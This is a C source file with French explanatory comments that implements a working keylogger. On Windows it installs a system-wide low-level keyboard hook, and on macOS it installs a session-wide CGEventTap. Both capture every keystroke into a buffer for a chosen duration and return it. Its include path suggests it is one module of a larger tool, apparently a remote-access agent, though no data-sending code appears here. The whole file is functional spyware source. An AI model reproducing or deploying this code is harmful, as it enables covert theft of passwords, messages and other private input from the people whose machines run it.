#include <stdlib.h>
#include <string.h>
#include "../../../include/keylog.h"

/* buffer où on stocke les touches capturées */
static char keylog_buffer[4096];
static int  keylog_pos = 0;

/* ═══════════════════════════════════════════════════════════
 * WINDOWS
 * ═══════════════════════════════════════════════════════════ */
#ifdef _WIN32
#include <windows.h>
/* KeyboardProc — Windows appelle cette fonction à chaque touche enfoncée
 * nCode  : est-ce que l'event est valide ? (HC_ACTION = oui)
 * wParam : quel type d'event ? (WM_KEYDOWN = touche enfoncée)
 * lParam : pointeur vers les infos de la touche (keycode, etc.)
 */
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        /* cast lParam pour accéder aux infos de la touche */
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        /* vkCode c'est le code de la touche
         * 0x41 = A, 0x5A = Z (codes ASCII majuscules) */
        char key[16] = {0};
        if (kb->vkCode >= 0x41 && kb->vkCode <= 0x5A)
            /* lettre : on la convertit directement en caractère */
            snprintf(key, sizeof(key), "%c", (char)kb->vkCode);
        else if (kb->vkCode == VK_SPACE)
            snprintf(key, sizeof(key), "[ESPACE]");
        else if (kb->vkCode == VK_RETURN)
            snprintf(key, sizeof(key), "[ENTREE]");
        else if (kb->vkCode == VK_BACK)
            snprintf(key, sizeof(key), "[BACKSPACE]");
        else if (kb->vkCode == VK_TAB)
            snprintf(key, sizeof(key), "[TAB]");
        else
            /* touche inconnue : on affiche son code numérique */
            snprintf(key, sizeof(key), "[%lu]", kb->vkCode);

        /* ajouter la touche au buffer si il reste de la place */
        if (keylog_pos + (int)strlen(key) < (int)sizeof(keylog_buffer) - 1) {
            strcat(keylog_buffer, key);
            keylog_pos += strlen(key);
        }
    }

    /* obligatoire : passer l'event au hook suivant
     * sans ça, les touches n'arrivent plus aux applications */
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
 * start_keylog — installe le hook clavier et capture pendant duration_seconds
 * retourne une string avec toutes les touches capturées
 */
char *start_keylog(int duration_seconds)
{
    /* remettre le buffer à zéro avant de commencer */
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
    keylog_pos = 0;

    /* étape 1 : installer le hook
     * WH_KEYBOARD_LL = hook clavier bas niveau (toute la machine)
     * KeyboardProc   = notre fonction callback
     * NULL, 0        = pas besoin de module spécifique
     */
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    /* si hook est NULL, Windows a refusé */
    if (!hook)
        return "[keylog: SetWindowsHookEx a échoué]";

    /* étape 2 : boucle d'attente pendant duration_seconds
     * sur Windows il n'y a pas de RunLoop comme macOS
     * on calcule le temps de fin et on tourne jusqu'à l'atteindre
     * GetTickCount() retourne le temps en millisecondes depuis le démarrage
     */
    DWORD end_time = GetTickCount() + (duration_seconds * 1000);
    MSG msg;
    while (GetTickCount() < end_time) {
        /* PeekMessage récupère les events en attente sans bloquer
         * c'est lui qui permet à Windows d'appeler KeyboardProc */
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
            DispatchMessage(&msg);
        /* Sleep(10) pour ne pas consommer 100% du CPU */
        Sleep(10);
    }

    /* étape 3 : désinstaller le hook proprement */
    UnhookWindowsHookEx(hook);

    return keylog_buffer;
}

/* ═══════════════════════════════════════════════════════════
 * MACOS
 * ═══════════════════════════════════════════════════════════ */
#elif __APPLE__
#include <ApplicationServices/ApplicationServices.h>

/*
 * EventCallback — macOS appelle cette fonction à chaque touche enfoncée
 * proxy  : identifiant interne macOS (on ne l'utilise pas)
 * type   : type d'événement (keydown, keyup...)
 * event  : l'événement lui-même, contient le keycode
 * refcon : données personnalisées qu'on aurait pu passer (on n'en a pas)
 */
static CGEventRef EventCallback(CGEventTapProxy proxy, CGEventType type,
                                 CGEventRef event, void *refcon)
{
    (void)proxy;
    (void)refcon;

    if (type == kCGEventKeyDown) {
        /* récupérer le code de la touche enfoncée */
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode);

        /* les keycodes macOS ne sont pas des codes ASCII
         * on fait une correspondance manuelle pour les lettres courantes */
        const char *map = "asdfhjklzcvbnmqwertyuiop";
        char key[16] = {0};
        if (keycode < 26)
            snprintf(key, sizeof(key), "%c", map[keycode]);
        else
            snprintf(key, sizeof(key), "[%d]", keycode); /* touches spéciales : Entrée, Espace... */

        /* ajouter la touche au buffer si il reste de la place */
        if (keylog_pos + (int)strlen(key) < (int)sizeof(keylog_buffer) - 1) {
            strcat(keylog_buffer, key);
            keylog_pos += strlen(key);
        }
    }

    /* obligatoire : laisser passer l'événement aux autres applications */
    return event;
}

/*
 * start_keylog — installe le hook clavier et capture pendant duration_seconds
 * retourne une string avec toutes les touches capturées
 */
char *start_keylog(int duration_seconds)
{
    /* remettre le buffer à zéro avant de commencer */
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
    keylog_pos = 0;

    /* étape 1 : se présenter à macOS et installer le robinet
     * kCGSessionEventTap    = intercepter au niveau de toute la session
     * kCGHeadInsertEventTap = se mettre en premier dans la chaîne
     * kCGEventTapOptionDefault = on peut voir et modifier les events
     * CGEventMaskBit(kCGEventKeyDown) = uniquement les touches enfoncées
     * EventCallback = notre fonction hook
     */
    CFMachPortRef tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown),
        EventCallback,
        NULL
    );

    /* si tap est NULL, macOS a refusé (permissions Accessibilité non activées) */
    if (!tap)
        return "[keylog: active Accessibilite dans Preferences Systeme > Confidentialite]";

    /* étape 2 : convertir le tap en source que le RunLoop comprend (câble adaptateur) */
    CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(NULL, tap, 0);

    /* étape 3 : brancher la source dans le RunLoop actuel */
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);

    /* étape 4 : allumer le robinet */
    CGEventTapEnable(tap, true);

    /* étape 5 : attendre ici pendant duration_seconds
     * pendant cette pause macOS peut appeler EventCallback à chaque frappe */
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, duration_seconds, false);

    /* étape 6 : nettoyer dans l'ordre inverse */
    CGEventTapEnable(tap, false);                                              /* éteindre le robinet */
    CFRunLoopRemoveSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);  /* débrancher */
    CFRelease(src);                                                            /* libérer la mémoire du câble */
    CFRelease(tap);                                                            /* libérer la mémoire du robinet */

    return keylog_buffer;
}

/* ═══════════════════════════════════════════════════════════
 * LINUX / AUTRE — non implémenté
 * ═══════════════════════════════════════════════════════════ */
#else

char *start_keylog(int duration_seconds)
{
    (void)duration_seconds; /* évite le warning "variable non utilisée" */
    return "[keylog not supported on this platform]";
}

#endif
